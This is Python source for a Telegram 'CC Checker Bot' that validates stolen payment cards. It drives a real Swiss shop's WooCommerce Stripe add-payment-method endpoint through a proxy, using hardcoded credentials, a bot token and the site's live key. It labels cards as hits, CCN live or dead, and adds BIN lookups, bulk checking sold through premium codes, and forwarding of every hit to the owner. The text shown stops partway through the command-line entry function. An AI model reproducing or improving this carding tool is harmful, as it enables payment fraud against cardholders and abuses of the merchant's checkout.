from __future__ import annotations


import aiohttp
import asyncio
import json
import os
import re
import sys
import random
import string
from pathlib import Path
from typing import Dict, List


# ---------- CONFIG ----------
DOMAIN = "https://www.siradis.ch/"
PK = "pk_live_YGAiZeDs1geV3QkiqptE85190062VmkYmr"
# If you need session cookies for logged-in user, paste like:
COOKIES = ""  # e.g. "wordpress_logged_in=...; other=..."
TIMEOUT = 25
SUCCESS_MESSAGE = "Success ✅"
PROXY_HOST = "geo.g-w.info"
PROXY_PORT = 10080
PROXY_USERNAME = "user-mQ38HLn74RbyjWE6-type-residential-session-7jm9cq9j-country-US-city-New_York-rotation-15"
PROXY_PASSWORD = "xdJZb2GOLrXlSXqk"
PROXY_URL = f"http://{PROXY_USERNAME}:{PROXY_PASSWORD}@{PROXY_HOST}:{PROXY_PORT}"
PROXY_AUTH = aiohttp.BasicAuth(PROXY_USERNAME, PROXY_PASSWORD)
KNOWN_COMMANDS = {
    "/start",
    "/help",
    "/chk",
    "/mass",
    "/premium",
    "/reedem",
    "/redeem",
    "/user",
    "/stop",
}
def format_commands_overview(is_owner: bool) -> str:
    base_lines = [
        "🤖 Bot Commands",
        "",
        "• /start  — show quick intro",
        "• /help   — quick usage refresher",
        "• /chk CC|MM|YY|CVV  — check one card",
        "• /mass  — bulk check (reply /mass to your .txt file; premium only)",
        "• /reedem CODE  — redeem premium code for /mass access",
        "• /stop  — cancel current /mass run",
        "",
        "Format: CC|MM|YY|CVV (no spaces).",
    ]
    if is_owner:
        base_lines.insert(6, "• /premium  — owner only: generate premium codes")
        base_lines.insert(7, "• /user  — owner only: list premium users & hits")
    return "\n".join(base_lines)



# Telegram bot configuration. You can still override via TELEGRAM_BOT_TOKEN env var.
TELEGRAM_BOT_TOKEN = (os.getenv("TELEGRAM_BOT_TOKEN", "").strip() or "8358197389:AAG5Mb8u5ZJEyACObX86VrtGwnM9PyYSInU")
if TELEGRAM_BOT_TOKEN:
    TELEGRAM_API_BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
else:
    TELEGRAM_API_BASE = None

# Per-chat cancel flags for /mass; chat_id -> True when /stop requested
TELEGRAM_MASS_CANCEL: Dict[int, bool] = {}

# Premium configuration
TELEGRAM_OWNER_ID = 1172862169
PREMIUM_DATA_FILE = Path(__file__).with_name("premium_data.json")


def _load_premium_data():
    """Load premium codes and users from disk."""
    try:
        if PREMIUM_DATA_FILE.exists():
            data = json.loads(PREMIUM_DATA_FILE.read_text())
            if isinstance(data, dict):
                data.setdefault("codes", [])
                data.setdefault("users", [])
                if not isinstance(data["codes"], list):
                    data["codes"] = []
                if not isinstance(data["users"], list):
                    data["users"] = []
                if not isinstance(data.get("user_hits"), dict):
                    data["user_hits"] = {}
                return data
    except Exception:
        pass
    return {"codes": [], "users": [], "user_hits": {}}


def _save_premium_data(data) -> None:
    try:
        PREMIUM_DATA_FILE.write_text(json.dumps(data))
    except Exception:
        # Don't crash the bot if disk write fails
        pass


def _normalize_user_key(user_id: int | str | None) -> str | None:
    try:
        return str(int(user_id))
    except Exception:
        return None


def _ensure_hits_dict(data: dict) -> dict:
    hits_map = data.get("user_hits")
    if not isinstance(hits_map, dict):
        hits_map = {}
    data["user_hits"] = hits_map
    return hits_map


def generate_premium_code() -> str:
    """Generate and store a new premium code."""
    data = _load_premium_data()
    codes = set(str(c).strip().upper() for c in data.get("codes", []))
    alphabet = string.ascii_uppercase + string.digits
    code = None
    while not code or code in codes:
        code = "".join(random.choice(alphabet) for _ in range(12))
    codes.add(code)
    data["codes"] = list(codes)
    _save_premium_data(data)
    return code


def user_has_premium(user_id: int) -> bool:
    data = _load_premium_data()
    users = data.get("users", [])
    try:
        uid = int(user_id)
    except Exception:
        return False
    return uid in [int(u) for u in users]


def redeem_premium_code(user_id: int, code: str):
    """Try to redeem a premium code for this user. Returns (success, message)."""
    code = (code or "").strip().upper()
    if not code:
        return False, "⚠️ Usage: /reedem CODE\nExample: /reedem ABC123XYZ789"

    data = _load_premium_data()
    users = data.get("users", [])

    # Already premium
    try:
        uid = int(user_id)
    except Exception:
        return False, "❌ Could not determine your Telegram user id."

    if uid in [int(u) for u in users]:
        return True, "✅ You already have premium access. You can use /mass now."

    codes = [str(c).strip().upper() for c in data.get("codes", [])]
    if code not in codes:
        return False, "❌ Invalid or already used premium code."

    # Consume the code and mark user as premium
    codes.remove(code)
    users.append(uid)
    data["codes"] = codes
    data["users"] = users
    hits_map = _ensure_hits_dict(data)
    user_key = _normalize_user_key(uid)
    if user_key:
        hits_map.setdefault(user_key, 0)
    _save_premium_data(data)

    return True, "✅ Premium activated! You can now use /mass for bulk checks."


def add_user_hits(user_id: int, hits: int) -> None:
    """Increment stored hit counter for a premium user."""
    if hits <= 0:
        return
    user_key = _normalize_user_key(user_id)
    if not user_key:
        return
    data = _load_premium_data()
    hits_map = _ensure_hits_dict(data)
    current = 0
    try:
        current = int(hits_map.get(user_key, 0))
    except Exception:
        current = 0
    hits_map[user_key] = current + int(hits)
    data["user_hits"] = hits_map
    _save_premium_data(data)


async def notify_owner_of_hit(
    session: aiohttp.ClientSession,
    source_chat_id: int | None,
    source_user_id: int | None,
    source_username: str | None,
    text_block: str,
) -> None:
    """Send hit details to the owner."""
    if not TELEGRAM_API_BASE or not TELEGRAM_OWNER_ID:
        return
    username_line = (
        f"Username: @{source_username}"
        if source_username
        else "Username: unknown"
    )
    details = [
        "📣 Hit reported",
        f"From chat: {source_chat_id}" if source_chat_id else "From chat: unknown",
        f"User id: {source_user_id}" if source_user_id else "User id: unknown",
        username_line,
        "",
        text_block,
    ]
    await send_telegram_message(session, TELEGRAM_OWNER_ID, "\n".join(details))


def get_premium_users_with_hits() -> List[tuple[int, int]]:
    """Return [(user_id, hits), ...] for all premium users."""
    data = _load_premium_data()
    hits_map = data.get("user_hits") or {}
    stats: List[tuple[int, int]] = []
    for u in data.get("users", []):
        key = _normalize_user_key(u)
        if not key:
            continue
        try:
            uid = int(key)
        except Exception:
            continue
        try:
            hits = int(hits_map.get(key, 0))
        except Exception:
            hits = 0
        stats.append((uid, hits))
    stats.sort(key=lambda item: (-item[1], item[0]))
    return stats


def format_premium_users_summary() -> str:
    stats = get_premium_users_with_hits()
    if not stats:
        return "👥 Premium Users\n\nNo premium users have redeemed a code yet."
    lines = ["👥 Premium Users & Hits", ""]
    for idx, (uid, hits) in enumerate(stats, start=1):
        lines.append(f"{idx}. {uid} — Hits: {hits}")
    total_hits = sum(h for _, h in stats)
    lines.append("")
    lines.append(f"Total hits recorded: {total_hits}")
    return "\n".join(lines)


# ----------------------------

_re_tags = re.compile(r"<[^>]+>")
_re_spaces = re.compile(r"\s+")

def html_to_oneliner(text: str, max_len: int = 500) -> str:
    if not text:
        return ""
    # remove scripts/styles contents
    text = re.sub(r"(?is)<(script|style).*?>.*?</\1>", " ", text)
    # strip tags
    text = _re_tags.sub(" ", text)
    # decode basic entities
    text = text.replace("&nbsp;", " ").replace("&amp;", "&").replace("&quot;", '"').replace("&#39;", "'")
    # collapse whitespace
    text = _re_spaces.sub(" ", text).strip()
    if len(text) > max_len:
        return text[:max_len//2].rstrip() + " ... " + text[-max_len//2:].lstrip()
    return text

def extract_message_from_json(obj: dict) -> str:
    """Extract likely user-facing messages from a JSON response.

    Join 'error', 'message', 'messages', 'data', 'result', 'response' fields if present.
    """
    parts = []
    for key in ("error", "message", "messages", "data", "result", "response", "status", "error_message"):
        if key in obj:
            v = obj[key]
            if isinstance(v, str):
                parts.append(v.strip())
            elif isinstance(v, dict):
                # collect string values shallow
                for sv in v.values():
                    if isinstance(sv, str):
                        parts.append(sv.strip())
            elif isinstance(v, list):
                for it in v:
                    if isinstance(it, str):
                        parts.append(it.strip())
    # Stripe style nested error object
    if "error" in obj and isinstance(obj["error"], dict):
        err = obj["error"]
        for k in ("message", "code", "type"):
            if k in err and isinstance(err[k], str):
                parts.append(err[k].strip())
    # fallback: top-level string values
    if not parts:
        for k, v in obj.items():
            if isinstance(v, str):
                parts.append(v.strip())
    # join and return
    joined = " ".join([p for p in parts if p])
    return joined.strip()


def sanitize_response_message(msg: str) -> str:
    """Hide sensitive Stripe/setup intent IDs and internal URLs from messages."""
    if not msg:
        return msg
    # Remove setup_intent IDs like seti_* and their secrets
    msg = re.sub(r"seti_[A-Za-z0-9_]+", "", msg)
    # Remove redirect URLs to the payment methods page (encoded or plain)
    msg = msg.replace(
        "https%3A%2F%2Fwww.siradis.ch%2Fen%2Fmy-account%2Fpayment-methods%2F", "",
    )
    msg = msg.replace(
        "https://www.siradis.ch/en/my-account/payment-methods/", "",
    )
    # Collapse extra spaces after removals
    msg = _re_spaces.sub(" ", msg).strip()
    return msg


def is_success_response(obj: dict) -> bool:
    """Heuristically detect a successful add-payment-method response."""
    if not isinstance(obj, dict):
        return False

    result_val = str(obj.get("result", "")).lower()
    if result_val in ("success", "succeeded"):
        return True

    def _is_success_url(val: object) -> bool:
        if not isinstance(val, str):
            return False
        return "my-account" in val and "payment-methods" in val

    for key in ("redirect", "return_url", "url"):
        if _is_success_url(obj.get(key)):
            return True

    data = obj.get("data")
    if isinstance(data, dict):
        for key in ("redirect", "return_url", "url"):
            if _is_success_url(data.get(key)):
                return True

    return False


async def extract_cards_from_document(session: aiohttp.ClientSession, doc: dict | None) -> List[str]:
    """Download a Telegram document (txt) and return non-empty lines."""
    cards: List[str] = []
    if not doc or not TELEGRAM_API_BASE:
        return cards
    file_id = doc.get("file_id")
    if not file_id:
        return cards
    status_file, text_file = await req_text(
        session,
        "GET",
        f"{TELEGRAM_API_BASE}/getFile?file_id={file_id}",
    )
    if status_file != 200 or not text_file:
        return cards
    try:
        info = json.loads(text_file)
        file_path = (info.get("result") or {}).get("file_path")
    except Exception:
        file_path = None
    if not file_path:
        return cards
    download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
    status_dl, file_content = await req_text(session, "GET", download_url)
    if status_dl != 200 or not file_content:
        return cards
    for ln in file_content.splitlines():
        ln = ln.strip()
        if ln:
            cards.append(ln)
    return cards


async def fetch_bin_data(session: aiohttp.ClientSession, bin_number: str):
    """Fetch raw BIN JSON from jonasapi and return dict or None on failure."""
    bin_number = (bin_number or "").strip()
    if not bin_number or len(bin_number) < 6:
        return None

    url = f"https://api.jonasapi.com/api/bin?bin={bin_number}"
    status, text = await req_text(session, "GET", url, use_proxy=True)
    if status != 200 or not text:
        return None

    try:
        data = json.loads(text)
    except Exception:
        return None

    if not isinstance(data, dict):
        return None

    # Ensure BIN number is present in the dict for convenience
    data.setdefault("bin", bin_number)
    return data


async def fetch_bin_info(session: aiohttp.ClientSession, bin_number: str) -> str:
    """Call jonasapi BIN endpoint and return a short, readable description or '' on failure."""
    data = await fetch_bin_data(session, bin_number)
    if not data:
        return ""

    bin_number = (data.get("bin") or bin_number or "").strip()
    brand = data.get("brand") or ""
    type_ = data.get("type") or ""
    level = data.get("level") or ""
    bank = data.get("bank") or ""
    country_name = data.get("country_name") or data.get("country") or ""
    flag = data.get("country_flag") or ""

    parts = [f"BIN {bin_number}"]
    bt = " ".join([p for p in (brand, type_, level) if p])
    if bt:
        parts.append(bt)

    loc = " ".join([p for p in (country_name, flag) if p])
    if loc:
        parts.append(loc)

    if bank:
        parts.append(bank)

    return " | ".join(parts)


async def format_success_with_bin(session: aiohttp.ClientSession, cc: str) -> str:
    """Return 'Success ✅' plus BIN info for the given card number, when available."""
    bin_number = (cc or "").strip()[:6]
    bin_info = await fetch_bin_info(session, bin_number)
    if bin_info:
        return f"{SUCCESS_MESSAGE} | {bin_info}"
    return SUCCESS_MESSAGE


def parseX(data: str, start: str, end: str):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

async def req_text(
    session: aiohttp.ClientSession,
    method: str,
    url: str,
    headers=None,
    data=None,
    use_proxy: bool = False,
):
    proxy_kwargs = {}
    if use_proxy and PROXY_URL:
        proxy_kwargs["proxy"] = PROXY_URL
        if PROXY_AUTH:
            proxy_kwargs["proxy_auth"] = PROXY_AUTH
    try:
        async with session.request(
            method, url, headers=headers, data=data, timeout=TIMEOUT, **proxy_kwargs
        ) as resp:
            txt = await resp.text(errors="ignore")
            return resp.status, txt
    except asyncio.TimeoutError:
        return "timeout", ""
    except Exception as e:
        return "error", str(e)

async def ppc(session: aiohttp.ClientSession, cards: str):
    """
    Process one card line and return (card_line, one_line_response)
    """
    card_line = cards.strip()
    try:
        cc, mon, year, cvv = [p.strip() for p in card_line.split("|")]
    except Exception:
        return card_line, "invalid_format"

    # 1) GET the add-payment-method page (try to obtain nonce)
    add_url = DOMAIN.rstrip("/") + "/my-account/add-payment-method/"
    headers_get = {"user-agent":"clean-checker"}
    if COOKIES:
        headers_get["cookie"] = COOKIES
    status_get, text_get = await req_text(
        session, "GET", add_url, headers=headers_get, use_proxy=True
    )
    nonce = None
    if text_get:
        m = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', text_get)
        if m:
            nonce = m.group(1)

    # 2) Create payment method via Stripe (publishable key usage)
    stripe_url = "https://api.stripe.com/v1/payment_methods"
    headers_stripe = {
        "user-agent":"clean-checker",
        "accept":"application/json",
        "content-type":"application/x-www-form-urlencoded"
    }
    data_stripe = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_year]": year[-2:],
        "card[exp_month]": mon,
        "key": PK,
        "_stripe_version": "2024-06-20",
    }
    status_stripe, text_stripe = await req_text(
        session,
        "POST",
        stripe_url,
        headers=headers_stripe,
        data=data_stripe,
        use_proxy=True,
    )

    # Try parse payment method id
    pmid = None
    parsed_stripe = None
    if text_stripe:
        try:
            parsed_stripe = json.loads(text_stripe)
            if isinstance(parsed_stripe, dict):
                pmid = parsed_stripe.get("id") or parsed_stripe.get("payment_method")
        except Exception:
            parsed_stripe = None

    # 3) Confirm/setup intent on site (wc-ajax)
    ajax_url = DOMAIN.rstrip("/") + "/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
    headers_ajax = {
        "user-agent":"clean-checker",
        "referer": add_url,
        "content-type":"application/x-www-form-urlencoded; charset=UTF-8"
    }
    if COOKIES:
        headers_ajax["cookie"] = COOKIES
    data_ajax = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": pmid or "",
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce or "",
    }
    status_ajax, text_ajax = await req_text(
        session,
        "POST",
        ajax_url,
        headers=headers_ajax,
        data=data_ajax,
        use_proxy=True,
    )

    # Prefer site ajax response if present
    if text_ajax:
        try:
            j = json.loads(text_ajax)
            if isinstance(j, dict):
                # If this looks like a successful add-payment-method, show success with BIN info
                if is_success_response(j):
                    success_msg = await format_success_with_bin(session, cc)
                    return card_line, success_msg
                msg = extract_message_from_json(j)
                if msg:
                    msg = sanitize_response_message(msg)
                    # If the site says the security code is incorrect, treat as CCN live and show BIN info
                    if "security code is incorrect" in msg.lower():
                        success_msg = await format_success_with_bin(session, cc)
                        return card_line, html_to_oneliner(f"{success_msg} | {msg}")
                    if not msg:
                        msg = "no_message"
                    return card_line, html_to_oneliner(msg)
            # else fallback to raw ajax text stripped (sanitized)
            return card_line, html_to_oneliner(sanitize_response_message(text_ajax))
        except Exception:
            return card_line, html_to_oneliner(sanitize_response_message(text_ajax))

    # If no ajax response, fallback to stripe response (raw)
    if text_stripe:
        # if JSON, extract message fields
        if parsed_stripe and isinstance(parsed_stripe, dict):
            msg = extract_message_from_json(parsed_stripe)
            if msg:
                msg = sanitize_response_message(msg)
                return card_line, html_to_oneliner(msg)
        # else fallback to raw stripe text
        return card_line, html_to_oneliner(sanitize_response_message(text_stripe))

    # final fallback: status summary
    return card_line, f"no_response (get={status_get}, stripe={status_stripe}, ajax={status_ajax})"

async def send_telegram_message(session: aiohttp.ClientSession, chat_id: int, text: str) -> None:
    """Send a message to a Telegram chat using the Bot API."""
    if not TELEGRAM_API_BASE:
        return

    data = {
        "chat_id": str(chat_id),
        "text": text,
    }
    headers = {
        "content-type": "application/x-www-form-urlencoded",
    }
    await req_text(session, "POST", TELEGRAM_API_BASE + "/sendMessage", headers=headers, data=data)


async def send_or_edit_progress_message(
    session: aiohttp.ClientSession,
    chat_id: int,
    message_id: int | None,
    text: str,
) -> int | None:
    """Send a new progress message or edit an existing one, returning its message_id.

    Used by /mass so we only have a single updating progress line instead of
    spamming many messages.
    """
    if not TELEGRAM_API_BASE:
        return message_id

    headers = {"content-type": "application/x-www-form-urlencoded"}

    # First time: sendMessage and capture message_id
    if not message_id:
        data = {"chat_id": str(chat_id), "text": text}
        status, body = await req_text(
            session,
            "POST",
            TELEGRAM_API_BASE + "/sendMessage",
            headers=headers,
            data=data,
        )
        if status == 200 and body:
            try:
                payload = json.loads(body)
                if payload.get("ok") and isinstance(payload.get("result"), dict):
                    mid = payload["result"].get("message_id")
                    if isinstance(mid, int):
                        return mid
            except Exception:
                pass
        return message_id

    # Next updates: editMessageText
    data = {"chat_id": str(chat_id), "message_id": str(message_id), "text": text}
    await req_text(
        session,
        "POST",
        TELEGRAM_API_BASE + "/editMessageText",
        headers=headers,
        data=data,
    )
    return message_id



def classify_telegram_status(resp: str) -> str:
    """Classify a ppc() response string into HITS / CCN LIVE / DEAD.

    Concept (as requested):
    - HITS ✅     -> succeeded + Stripe/site success flow (our own success text).
    - CCN LIVE 🟡 -> only for "Your card's security code is incorrect." responses.
    - DEAD ❌     -> ALL other responses.
    """
    r = (resp or "").lower()

    # 1) CVV incorrect should always be CCN LIVE
    if "security code is incorrect" in r:
        return "cvc"

    # 2) Real successes: our own success text or Stripe/site "succeeded" pattern
    if SUCCESS_MESSAGE.lower() in r or "success ✅" in r or "succeeded" in r:
        return "success"

    # 3) Everything else is treated as DEAD/decline
    return "decline"


def format_telegram_result_line(card: str, resp: str) -> str:
    """Return a single, attractive one-line summary (kept for compatibility)."""
    status = classify_telegram_status(resp)
    if status == "success":
        emoji = "✅"
    elif status == "cvc":
        emoji = "🟡"
    elif status == "decline":
        emoji = "❌"
    elif status == "invalid":
        emoji = "⚠️"
    elif status == "error":
        emoji = "❗"
    else:
        emoji = "ℹ️"
    return f"{emoji} {card} -> {resp}"


async def format_telegram_card_block(
    session: aiohttp.ClientSession, card: str, resp: str
) -> str:
    """Format a full multi-line Telegram block similar to your screenshot."""
    status_key = classify_telegram_status(resp)
    if status_key == "success":
        status_label = "HITS"
        status_emoji = "✅"
    elif status_key == "cvc":
        status_label = "CCN LIVE"
        status_emoji = "🟡"
    else:
        status_label = "DEAD"
        status_emoji = "❌"

    # Human-friendly response text
    response_text = resp or ""
    if response_text == "invalid_format":
        response_text = "Invalid format. Use CC|MM|YY|CVV."
    else:
        lower = response_text.lower()
        # For CVC incorrect, keep the last part after the BIN/success noise
        if "security code is incorrect" in lower:
            parts = [p.strip() for p in response_text.split("|") if p.strip()]
            if len(parts) >= 2:
                response_text = parts[-1]
        # For plain successes with BIN info inline, collapse to a short success text
        elif "success" in lower and "bin" in lower:
            response_text = SUCCESS_MESSAGE

    # BIN details
    cc_number = (card.split("|", 1)[0] or "").strip()
    bin_number = cc_number[:6]
    bin_data = await fetch_bin_data(session, bin_number)

    def _val(data: dict | None, key: str, default: str = "Unknown", upper: bool = False) -> str:
        if not isinstance(data, dict):
            v = default
        else:
            v = str(data.get(key) or "").strip() or default
        if upper:
            v = v.upper()
        return v

    type_ = _val(bin_data, "type", "Unknown", upper=True)
    level = _val(bin_data, "level", "Unknown", upper=False)
    country = _val(bin_data, "country_name", "") or _val(
        bin_data, "country", "Unknown", upper=True
    )
    bank = _val(bin_data, "bank", "Unknown", upper=True)

    lines = [
        "Stripe Auth",
        "",
        f"CC: {card}",
        f"Status: {status_label} {status_emoji}",
        f"Response: {response_text}",
        "",
        f"Type: {type_}",
        f"Level: {level}",
        f"Country: {country}",
        f"Bank: {bank}",
    ]
    return "\n".join(lines)


async def handle_telegram_update(session: aiohttp.ClientSession, update: dict) -> None:
    """Handle a single Telegram update.

    Supported:
    - /start, /help
    - /chk CC|MM|YY|CVV for a single card
    - /mass for multiple cards or a .txt file with combos
    """
    message = update.get("message") or update.get("edited_message")
    if not message:
        return

    chat = message.get("chat") or {}
    chat_id = chat.get("id")
    if not chat_id:
        return

    from_user = message.get("from") or {}
    user_id = from_user.get("id")
    username = (from_user.get("username") or "").strip() or None

    # Telegram uses `caption` for text sent with files; fall back to that.
    text = (message.get("text") or message.get("caption") or "").strip()
    doc = message.get("document")
    reply_to_message = message.get("reply_to_message") or {}
    reply_document = (reply_to_message or {}).get("document")

    # If nothing useful was sent
    if not text and not doc:
        await send_telegram_message(
            session,
            chat_id,
            "❓ Nothing to do.\n"
            "Use /help to see the available commands.",
        )
        return

    # User sent only a document: remind them to reply with /mass
    if doc and not text:
        await send_telegram_message(
            session,
            chat_id,
            "📁 Received your file.\n"
            "Now reply to that .txt message with /mass to start checking.",
        )
        return

    # Ignore unknown slash commands (only respond to ones listed in /help)
    if text.startswith("/"):
        first_token = text.split(maxsplit=1)[0]
        base_cmd = first_token.split("@", 1)[0]
        if base_cmd not in KNOWN_COMMANDS:
            return

    # /start: basic intro
    if text.startswith("/start"):
        await send_telegram_message(
            session,
            chat_id,
            "👋 Welcome to CC Checker Bot\n\n"
            "✅ Single check:\n"
            "   /chk 4242424242424242|12|26|123\n\n"
            "📦 Mass check (premium only):\n"
            "   /mass\n"
            "   4242...|12|26|123\n"
            "   5555...|01|27|456\n"
            "   (upload a .txt file, then reply to it with /mass)\n\n"
            "🎟 Premium codes are generated by the owner with /premium.\n"
            "   Redeem your code with /reedem CODE to unlock /mass.\n\n"
            "📁 Remember: reply to your .txt file with /mass (no spaces in combos).\n\n"
            "ℹ️ Success results include BIN info (brand, type, bank, country).",
        )
        return
    # /help: usage overview
    if text.startswith("/help"):
        is_owner = bool(user_id and user_id == TELEGRAM_OWNER_ID)
        await send_telegram_message(session, chat_id, format_commands_overview(is_owner))
        return

    # /premium: owner-only code generation
    if text.startswith("/premium"):
        if not user_id:
            await send_telegram_message(
                session,
                chat_id,
                "⚠️ Could not determine your Telegram user id. Please try again from a standard user account.",
            )
            return

        if user_id != TELEGRAM_OWNER_ID:
            await send_telegram_message(
                session,
                chat_id,
                "🚫 /premium is restricted to the owner. Use /reedem CODE to redeem a premium code.",
            )
            return

        code = generate_premium_code()
        await send_telegram_message(
            session,
            chat_id,
            "🎟 A new premium code has been generated:\n"
            f"{code}\n\n"
            "Share this code privately with the user who should get /mass access.",
        )
        return

    # /reedem or /redeem: redeem premium codes for users
    if text.startswith("/reedem") or text.startswith("/redeem"):
        if not user_id:
            await send_telegram_message(
                session,
                chat_id,
                "⚠️ Could not determine your Telegram user id. Please try again from a standard user account.",
            )
            return

        parts = text.split(maxsplit=1)
        args = parts[1].strip() if len(parts) > 1 else ""
        if not args:
            await send_telegram_message(
                session,
                chat_id,
                "Usage: /reedem CODE\nExample: /reedem ABC123XYZ789",
            )
            return

        ok, msg = redeem_premium_code(user_id, args)
        await send_telegram_message(session, chat_id, msg)
        return

    # /user: owner overview of premium users & hits
    if text.startswith("/user"):
        if user_id != TELEGRAM_OWNER_ID:
            await send_telegram_message(
                session,
                chat_id,
                "🚫 /user is restricted to the owner.",
            )
            return
        summary = format_premium_users_summary()
        await send_telegram_message(session, chat_id, summary)
        return

    # /stop: cancel current mass check for this chat
    if text.startswith("/stop"):
        TELEGRAM_MASS_CANCEL[chat_id] = True
        await send_telegram_message(
            session,
            chat_id,
            "⏹ Stopping current /mass check (if running). You can start a new one with /mass again.",
        )
        return
    # /chk: single card check
    if text.startswith("/chk"):
        payload = text[len("/chk") :].strip()
        if not payload:
            await send_telegram_message(
                session,
                chat_id,
                "Usage: /chk CC|MM|YY|CVV\nExample: /chk 4242424242424242|12|26|123",
            )
            return

        first_line = None
        for ln in payload.splitlines():
            ln = ln.strip()
            if ln:
                first_line = ln
                break

        if not first_line:
            await send_telegram_message(
                session,
                chat_id,
                "Usage: /chk CC|MM|YY|CVV\nExample: /chk 4242424242424242|12|26|123",
            )
            return

        await send_telegram_message(
            session,
            chat_id,
            f"⏳ Started checking:\n{first_line}",
        )

        card, resp = await ppc(session, first_line)
        text_block = await format_telegram_card_block(session, card, resp)
        status_key = classify_telegram_status(resp)
        if status_key == "success":
            if user_id and user_has_premium(user_id):
                add_user_hits(user_id, 1)
            await notify_owner_of_hit(session, chat_id, user_id, username, text_block)
        await send_telegram_message(session, chat_id, text_block)
        return

    # /mass: multiple cards from text or attached .txt file
    if text.startswith("/mass"):
        # Require premium access
        if not user_id or not user_has_premium(user_id):
            await send_telegram_message(
                session,
                chat_id,
                "🚫 /mass is premium-only.\n"
                "Redeem a valid code first using:\n"
                "/reedem CODE",
            )
            return

        payload = text[len("/mass") :].strip()
        cards: List[str] = []

        # Cards provided in the message text after /mass
        if payload:
            for ln in payload.splitlines():
                ln = ln.strip()
                if ln:
                    cards.append(ln)

        # If no text cards, and /mass is replying to a document (.txt), read from it
        if not cards and reply_document:
            cards.extend(await extract_cards_from_document(session, reply_document))

        if not cards:
            await send_telegram_message(
                session,
                chat_id,
                "⚠️ No cards found.\n\n"
                "Reply to the .txt file you uploaded with /mass, or include combos after /mass.\n"
                "Each line must follow CC|MM|YY|CVV.",
            )
            return

        # Reset stop flag for this chat and announce start
        TELEGRAM_MASS_CANCEL[chat_id] = False

        await send_telegram_message(
            session,
            chat_id,
            f"⏳ Started checking {len(cards)} cards...",
        )

        # Progress counters
        total = len(cards)
        done = 0
        hits_count = 0
        ccn_count = 0
        dead_count = 0
        stopped = False

        progress_message_id: int | None = None


        # Process cards sequentially to match /chk behavior and avoid site anti-bot issues
        for line in cards:
            # Check if user requested to stop this mass check
            if TELEGRAM_MASS_CANCEL.get(chat_id):
                stopped = True
                break

            try:
                card, resp = await ppc(session, line)
            except Exception as e:
                card, resp = line, f"error: {e}"

            status_key = classify_telegram_status(resp)
            text_block = await format_telegram_card_block(session, card, resp)

            done += 1
            if status_key == "success":
                hits_count += 1
                if user_id and user_has_premium(user_id):
                    add_user_hits(user_id, 1)
            elif status_key == "cvc":
                ccn_count += 1
            elif status_key == "decline":
                dead_count += 1

            # Update a single progress message with current counts
            stats_line = (
                f"✅ HITS: {hits_count} | 🟡 CCN: {ccn_count} | ❌ DEAD: {dead_count} | 📊 DONE: {done}/{total}"
            )

            progress_message_id = await send_or_edit_progress_message(
                session,
                chat_id,
                progress_message_id,
                stats_line,
            )

            # For HITS / CCN LIVE, also send the detailed card block as a separate message
            if status_key in ("success", "cvc"):
                await send_telegram_message(session, chat_id, text_block)

            if status_key == "success":
                await notify_owner_of_hit(session, chat_id, user_id, username, text_block)

        # Final summary line (respecting stop)
        summary_prefix = "⏹ Stopped.\n" if stopped else ""
        await send_telegram_message(
            session,
            chat_id,
            summary_prefix
            + f"✅ HITS: {hits_count} | 🟡 CCN: {ccn_count} | ❌ DEAD: {dead_count} | 📦 TOTAL DONE: {done}/{total}",
        )

        # Clear stop flag for this chat
        TELEGRAM_MASS_CANCEL.pop(chat_id, None)

        return

    # Ignore unknown slash-commands (only respond to commands documented in /help)
    if text.startswith("/"):
        cmd = text.split(maxsplit=1)[0].lower()
        if cmd not in KNOWN_COMMANDS:
            return

    # Fallback: treat any other plain text as a single card line
    if not text:
        await send_telegram_message(
            session,
            chat_id,
            "Use /help to see available commands and usage examples.",
        )
        return

    card, resp = await ppc(session, text)
    text_block = await format_telegram_card_block(session, card, resp)
    status_key = classify_telegram_status(resp)
    if status_key == "success":
        if user_id and user_has_premium(user_id):
            add_user_hits(user_id, 1)
        await notify_owner_of_hit(session, chat_id, user_id, username, text_block)
    await send_telegram_message(session, chat_id, text_block)


async def handle_telegram_update_safe(session: aiohttp.ClientSession, update: dict) -> None:
    """Wrapper that logs errors but doesn't crash the bot per update."""
    try:
        await handle_telegram_update(session, update)
    except Exception as e:
        # Do not crash on a single bad update
        print(f"telegram_update_error: {e}")



async def run_telegram_bot() -> None:
    """Run a simple long-polling Telegram bot that uses ppc() for checking cards."""
    if not TELEGRAM_API_BASE:
        print("TELEGRAM_BOT_TOKEN is not set; Telegram bot mode is disabled.")
        return

    connector = aiohttp.TCPConnector(limit=None)
    async with aiohttp.ClientSession(connector=connector) as session:
        offset = 0
        print("Starting Telegram bot...")

        while True:
            # Use long polling via getUpdates
            if offset:
                url = f"{TELEGRAM_API_BASE}/getUpdates?timeout={TIMEOUT}&offset={offset + 1}"
            else:
                url = f"{TELEGRAM_API_BASE}/getUpdates?timeout={TIMEOUT}"

            status, text = await req_text(session, "GET", url)

            if status == "timeout":
                # Just retry on timeout
                continue

            if status != 200 or not text:
                await asyncio.sleep(1)
                continue

            try:
                data = json.loads(text)
            except Exception:
                await asyncio.sleep(1)
                continue

            if not isinstance(data, dict) or not data.get("ok"):
                await asyncio.sleep(1)
                continue

            results = data.get("result") or []
            for upd in results:
                upd_id = upd.get("update_id")
                if isinstance(upd_id, int) and upd_id > offset:
                    offset = upd_id
                # Handle each update in its own task so /stop can interrupt a running /mass
                asyncio.create_task(handle_telegram_update_safe(session, upd))


async def main():
    """CLI entrypoint: ask for a combo file, then check all cards."""
    combo_path = input("Enter the path to your CC combo file: ").strip()
    p = Path(combo_path)
    if not p.exists():
        print("combo_file_not_found")
        return

    lines = [l.strip() for l in p.read_text().splitlines() if l.strip()]
    connector = aiohttp.TCPConnector(limit=None)
    sem = asyncio.Semaphore(6)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def worker(line: str):
            async with sem:
                try:
                    return await ppc(session, line)
                except Exception as e:
                    return line, f"error: {e}"

        tasks = [asyncio.create_task(worker(l)) for l in lines]
        for coro in asyncio.as_completed(tasks):
            card, resp = await coro
            # print exactly one-line response per card (no extra labels)
